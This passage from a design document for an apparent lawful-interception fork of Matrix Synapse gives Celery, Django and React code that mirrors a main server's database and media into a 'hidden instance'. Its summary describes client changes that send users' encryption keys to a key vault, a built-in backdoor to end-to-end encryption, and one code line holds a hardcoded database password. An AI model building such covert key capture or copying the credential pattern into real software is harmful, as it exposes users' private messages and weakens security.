    """Track individual sync task executions."""
    task_id = models.CharField(max_length=255, unique=True, db_index=True)
    status = models.CharField(
        max_length=20,
        choices=[
            ('pending', 'Pending'),
            ('running', 'Running'),
            ('success', 'Success'),
            ('failed', 'Failed'),
        ],
        default='pending'
    )
    created_at = models.DateTimeField(default=timezone.now)
    started_at = models.DateTimeField(null=True, blank=True)
    completed_at = models.DateTimeField(null=True, blank=True)
    error_message = models.TextField(blank=True)

    class Meta:
        db_table = 'sync_task'
        ordering = ['-created_at']
```

### 6.5 Celery Sync Task

**File**: `synapse_li/sync/tasks.py` (NEW FILE)

```python
"""
Celery task for syncing main instance → hidden instance.
"""

import subprocess
import logging
from celery import shared_task
from django.utils import timezone
from .models import SyncCheckpoint, SyncTask
from .lock import SyncLock
import redis

logger = logging.getLogger(__name__)

# Redis client for locking
redis_client = redis.Redis(host='localhost', port=6379, db=0)


@shared_task(bind=True)
def sync_instance(self):
    """
    Sync main instance → hidden instance.

    Steps:
    1. Acquire lock (prevent concurrent syncs)
    2. Get checkpoint (last sync position)
    3. Sync PostgreSQL via logical replication
    4. Sync media files via rsync
    5. Update checkpoint
    6. Release lock
    """
    task_id = self.request.id

    # Create task record
    task = SyncTask.objects.create(task_id=task_id, status='running')
    task.started_at = timezone.now()
    task.save()

    lock = SyncLock(redis_client)

    try:
        # Acquire lock
        with lock.lock():
            logger.info(f"Sync task {task_id} started")

            # Get checkpoint
            checkpoint = SyncCheckpoint.get_checkpoint()
            last_lsn = checkpoint.pg_lsn
            last_media_ts = checkpoint.last_media_sync_ts

            # Sync PostgreSQL
            logger.info(f"Syncing PostgreSQL from LSN {last_lsn}")
            new_lsn = sync_postgresql(last_lsn)

            # Sync media files
            logger.info(f"Syncing media files since {last_media_ts}")
            new_media_ts = sync_media_files(last_media_ts)

            # Update checkpoint
            checkpoint.update_checkpoint(new_lsn, new_media_ts)

            # Mark task as success
            task.status = 'success'
            task.completed_at = timezone.now()
            task.save()

            logger.info(f"Sync task {task_id} completed successfully")

    except RuntimeError as e:
        # Lock already held
        error_msg = str(e)
        logger.warning(f"Sync task {task_id} skipped: {error_msg}")
        task.status = 'failed'
        task.error_message = error_msg
        task.completed_at = timezone.now()
        task.save()

    except Exception as e:
        # Sync failed
        error_msg = str(e)
        logger.error(f"Sync task {task_id} failed: {error_msg}", exc_info=True)

        # Mark checkpoint as failed
        checkpoint = SyncCheckpoint.get_checkpoint()
        checkpoint.mark_failed()

        # Mark task as failed
        task.status = 'failed'
        task.error_message = error_msg
        task.completed_at = timezone.now()
        task.save()

        # Release lock if held
        if lock.is_locked():
            lock.release()

        raise


def sync_postgresql(from_lsn: str) -> str:
    """
    Sync PostgreSQL database using logical replication.

    Returns new LSN position after sync.
    """
    # Use pg_recvlogical to fetch changes from main instance
    cmd = [
        'pg_recvlogical',
        '-d', 'postgresql://synapse:password@main-db-host:5432/synapse',
        '--slot', 'hidden_instance_slot',
        '--start',
        '-f', '-',  # Output to stdout
        '--option', f'start_lsn={from_lsn}'
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, check=True)

    # Parse output for new LSN (last line contains LSN)
    lines = result.stdout.strip().split('\n')
    if lines:
        # Extract LSN from last line
        # Format: "LSN: 0/12345678"
        for line in reversed(lines):
            if 'LSN:' in line:
                new_lsn = line.split('LSN:')[1].strip()
                return new_lsn

    return from_lsn  # No changes


def sync_media_files(since: timezone.datetime) -> timezone.datetime:
    """
    Sync media files from main instance using rsync.

    Returns new timestamp after sync.
    """
    # rsync media directory from main instance
    cmd = [
        'rsync',
        '-avz',
        '--delete',  # Remove files deleted on source
        'main-media-host:/var/synapse/media/',
        '/var/synapse-li/media/'
    ]

    subprocess.run(cmd, check=True)

    return timezone.now()
```

**Note**: PostgreSQL logical replication and rsync details depend on your specific deployment. The above is a conceptual implementation.

### 6.6 Django REST API Endpoints

**File**: `synapse_li/sync/views.py` (NEW FILE)

```python
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .tasks import sync_instance
from .models import SyncTask
from celery.result import AsyncResult


class TriggerSyncView(APIView):
    """
    POST /api/v1/sync/trigger

    Trigger sync task (manual or periodic).
    Returns task_id for status checking.
    """

    def post(self, request):
        # Trigger Celery task
        task = sync_instance.delay()

        return Response({
            'task_id': task.id,
            'status': 'submitted'
        }, status=status.HTTP_202_ACCEPTED)


class SyncStatusView(APIView):
    """
    GET /api/v1/sync/status/<task_id>

    Check status of sync task.
    """

    def get(self, request, task_id):
        try:
            task = SyncTask.objects.get(task_id=task_id)

            return Response({
                'task_id': task_id,
                'status': task.status,
                'created_at': task.created_at.isoformat(),
                'completed_at': task.completed_at.isoformat() if task.completed_at else None,
                'error': task.error_message if task.status == 'failed' else None
            })

        except SyncTask.DoesNotExist:
            return Response({
                'error': 'Task not found'
            }, status=status.HTTP_404_NOT_FOUND)


class SyncConfigView(APIView):
    """
    POST /api/v1/sync/config

    Configure periodic sync frequency.

    Body:
    {
        "syncs_per_day": 24  // 1-24
    }
    """

    def post(self, request):
        syncs_per_day = request.data.get('syncs_per_day', 1)

        if not (1 <= syncs_per_day <= 24):
            return Response({
                'error': 'syncs_per_day must be between 1 and 24'
            }, status=status.HTTP_400_BAD_REQUEST)

        # Update Celery Beat schedule
        # This requires dynamic schedule update (see below)
        from django_celery_beat.models import PeriodicTask, IntervalSchedule

        # Calculate interval in hours
        interval_hours = 24 // syncs_per_day

        # Get or create interval schedule
        schedule, created = IntervalSchedule.objects.get_or_create(
            every=interval_hours,
            period=IntervalSchedule.HOURS
        )

        # Update periodic task
        periodic_task, created = PeriodicTask.objects.get_or_create(
            name='sync_instance_periodic'
        )
        periodic_task.interval = schedule
        periodic_task.task = 'sync.tasks.sync_instance'
        periodic_task.enabled = True
        periodic_task.save()

        return Response({
            'syncs_per_day': syncs_per_day,
            'interval_hours': interval_hours
        })
```

**File**: `synapse_li/sync/urls.py` (NEW FILE)

```python
from django.urls import path
from .views import TriggerSyncView, SyncStatusView, SyncConfigView

urlpatterns = [
    path('api/v1/sync/trigger', TriggerSyncView.as_view(), name='trigger_sync'),
    path('api/v1/sync/status/<str:task_id>', SyncStatusView.as_view(), name='sync_status'),
    path('api/v1/sync/config', SyncConfigView.as_view(), name='sync_config'),
]
```

### 6.7 synapse-admin-li Sync Button

**File**: `synapse-admin-li/src/layout/AppBar.tsx` (MODIFICATION)

```typescript
// LI: Import sync components
import { useState, useEffect } from 'react';
import { IconButton, Tooltip, CircularProgress } from '@mui/material';
import SyncIcon from '@mui/icons-material/Sync';
import { useNotify } from 'react-admin';

const SyncButton = () => {
    const [syncing, setSyncing] = useState(false);
    const [taskId, setTaskId] = useState<string | null>(null);
    const notify = useNotify();

    // LI: Trigger sync
    const handleSync = async () => {
        setSyncing(true);

        try {
            const response = await fetch('/api/v1/sync/trigger', {
                method: 'POST',
            });

            if (!response.ok) {
                throw new Error('Failed to trigger sync');
            }

            const data = await response.json();
            setTaskId(data.task_id);

            // LI: Poll status
            pollSyncStatus(data.task_id);
        } catch (error) {
            notify('Sync failed to start', { type: 'error' });
            setSyncing(false);
        }
    };

    // LI: Poll sync status
    const pollSyncStatus = async (taskId: string) => {
        const interval = setInterval(async () => {
            try {
                const response = await fetch(`/api/v1/sync/status/${taskId}`);
                const data = await response.json();

                if (data.status === 'success') {
                    notify('Sync completed successfully', { type: 'success' });
                    setSyncing(false);
                    setTaskId(null);
                    clearInterval(interval);
                } else if (data.status === 'failed') {
                    notify(`Sync failed: ${data.error}`, { type: 'error' });
                    setSyncing(false);
                    setTaskId(null);
                    clearInterval(interval);
                }
            } catch (error) {
                notify('Failed to check sync status', { type: 'error' });
                setSyncing(false);
                setTaskId(null);
                clearInterval(interval);
            }
        }, 5000);  // Poll every 5 seconds
    };

    return (
        <Tooltip title={syncing ? "Syncing in progress..." : "Sync from main instance"}>
            <span>
                <IconButton
                    color="inherit"
                    onClick={handleSync}
                    disabled={syncing}
                >
                    {syncing ? <CircularProgress size={24} color="inherit" /> : <SyncIcon />}
                </IconButton>
            </span>
        </Tooltip>
    );
};

// LI: Add SyncButton to AppBar
// In AppBar component's return statement, add:
// <SyncButton />  // Place next to logout/theme/refresh buttons
```

### 6.8 Periodic Sync Configuration UI

**File**: `synapse-admin-li/src/components/SyncSettings.tsx` (NEW FILE)

```typescript
/**
 * LI: Sync Settings Component
 *
 * Allows admin to configure periodic sync frequency.
 */

import { Card, CardContent, TextField, Button, Typography } from '@mui/material';
import { useState } from 'react';
import { useNotify } from 'react-admin';

export const SyncSettings = () => {
    const [syncsPerDay, setSyncsPerDay] = useState(1);
    const notify = useNotify();

    const handleSave = async () => {
        try {
            const response = await fetch('/api/v1/sync/config', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ syncs_per_day: syncsPerDay }),
            });

            if (!response.ok) {
                throw new Error('Failed to update sync config');
            }

            notify('Sync configuration updated', { type: 'success' });
        } catch (error) {
            notify('Failed to update sync config', { type: 'error' });
        }
    };

    return (
        <Card>
            <CardContent>
                <Typography variant="h6">Periodic Sync Configuration</Typography>
                <Typography variant="body2" color="textSecondary" gutterBottom>
                    Configure how many times per day the hidden instance syncs from the main instance.
                </Typography>

                <TextField
                    label="Syncs per day"
                    type="number"
                    value={syncsPerDay}
                    onChange={(e) => setSyncsPerDay(parseInt(e.target.value))}
                    inputProps={{ min: 1, max: 24 }}
                    helperText="1 = once daily, 24 = every hour"
                    style={{ marginTop: 16, marginBottom: 16 }}
                />

                <Button variant="contained" color="primary" onClick={handleSave}>
                    Save Configuration
                </Button>
            </CardContent>
        </Card>
    );
};
```

---

## Summary

### Project Structure
- **Main Instance**: synapse, element-web, synapse-admin, key_vault
- **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li

### Key Components Implemented

1. **key_vault (Django)**: Stores encrypted keys with deduplication
2. **RSA Encryption**: Hardcoded public key, admin keeps private key
3. **Synapse Proxy**: Validates tokens, forwards to key_vault
4. **Client Changes**: element-web & element-x-android send encrypted keys with 5-retry logic
5. **Sync System**: Celery-based with Redis locking, incremental checkpoints, on-demand + periodic

### Minimal Code Changes
- New files for core logic (LIKeyCapture.ts, li_proxy.py, etc.)
- Existing files modified with `// LI:` or `# LI:` comments for easy tracking
- Clean separation for upstream compatibility

### Next Steps
See [Part 2: Soft Delete & Deleted Messages](LI_REQUIREMENTS_ANALYSIS_02_SOFT_DELETE.md)
